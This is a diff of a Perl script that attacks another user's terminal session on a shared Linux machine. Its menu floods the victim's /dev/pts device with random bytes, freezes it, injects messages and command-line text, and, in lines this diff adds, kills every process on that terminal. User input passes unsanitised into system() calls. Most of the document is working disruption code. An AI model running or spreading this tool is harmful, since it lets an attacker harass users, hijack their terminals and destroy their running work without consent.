@@ -42,51 +42,81 @@ if($target_num > $i - 1){
 
 print "action required\n";
 
-print "Enter 1 for fuzzing there session\n";
-print "Enter 2 for freezing there session\n";
-print "Enter 3 to send a msg to there term\n";
-print "Enter 4 to type to there command line\n";
+print "Enter 1 to fuzz a session\n";
+print "Enter 2 to freeze a session\n";
+print "Enter 3 to send messages to a term\n";
+print "Enter 4 to type direct to a command line feed\n";
+print "Enter 5 to kill a session\n";
 
 
 my $sel = <>;
 chomp $sel;
 
-if ($sel != "1" && $sel != "2" && $sel != "3" && $sel != "4") {
-	exit (0);
+if ($sel ne "1" && $sel ne "2" && $sel ne "3" && $sel ne "4" && $sel ne "5") {
+  exit (0);
 }
 
-print "terminal is pts $target_num\n";
-if($sel == "1"){
-	print "fuzzing /dev/pts/$target_num\n";
-	print "press CTRL+C to stop\n";
-	system("cat /dev/urandom > /dev/pts/$target_num");
+print "terminal is pts $target_num and option is $sel\n";
 
+if($sel eq "1"){
+  print "fuzzing /dev/pts/$target_num\n";
+  print "press CTRL+C to stop\n";
+  system("cat /dev/urandom > /dev/pts/$target_num");
 }
 
-if($sel == "2"){
-	print "freezing /dev/pts/$target_num\n";
-	print "press CTRL+C to stop\n";
-	system("cat /dev/pts/$target_num /dev/pts/$target_num /dev/pts/$target_num");
+if($sel eq "2"){
+  print "freezing /dev/pts/$target_num\n";
+  print "press CTRL+C to stop\n";
+  system("cat /dev/pts/$target_num /dev/pts/$target_num /dev/pts/$target_num");
 }
 
-
-if($sel == "3"){
-	print "starting message sending to /dev/pts/$target_num\n";
-	print "press CTRL+C to stop\n";
-	while(1) {
-	my $ input = <>;
-	chomp $input;
-	system("echo $input > /dev/pts/$target_num");
+if($sel eq "3"){
+  print "starting message sending to /dev/pts/$target_num\n";
+  print "press CTRL+C to stop\n";
+  while(1) {
+    my $ input = <>;
+    chomp $input;
+    system("echo $input > /dev/pts/$target_num");
+    }
 }
+
+if($sel eq "4"){
+  print "starting message send on command line to /dev/pts/$target_num\n";
+  print "press CTRL+C to stop\n";
+  while(1) {
+    my $ input = <>;
+    chomp $input;
+    system("echo -n $input > /dev/pts/$target_num");
+    }
 }
 
-
-if($sel == "4"){
-	print "starting message send on command line to /dev/pts/$target_num\n";
-	print "press CTRL+C to stop\n";
-	while(1) {
-	my $ input = <>;
-	chomp $input;
-	system("echo -n $input > /dev/pts/$target_num");
-}
+if($sel eq "5"){
+  print "soft or hard kill?\n";
+  print "enter [soft] or [hard]\n";
+  my $kill_choice = <>;
+  chomp $kill_choice;
+  if($kill_choice ne "soft" && $kill_choice ne "hard") {
+    exit(0);
+  }
+  print "killing user session\n\n";
+  my $command = "ps -aux|egrep -vi \"grep\" | egrep \"pts/$target_num\" | awk '{print \$2}'";
+  my @pids = qx($command);
+  foreach (@pids) {
+    chomp $_;
+    my $xx = qx(ps $_);
+    print "Killing: $xx \n";
+    #hard kill
+    if($kill_choice eq "soft"){
+      print "soft kill\n";
+      system("kill -15 $_");
+      print "----------\n";
+    } 
+    if($kill_choice eq "hard"){
+      print "hard kill\n";
+      system("kill -9 $_");
+      print "----------\n";
+    }
+  my $result = qx(who | grep "pts/1" && echo "user still exists" || echo "user gone");
+  print $result, "\n";
+  }
 }
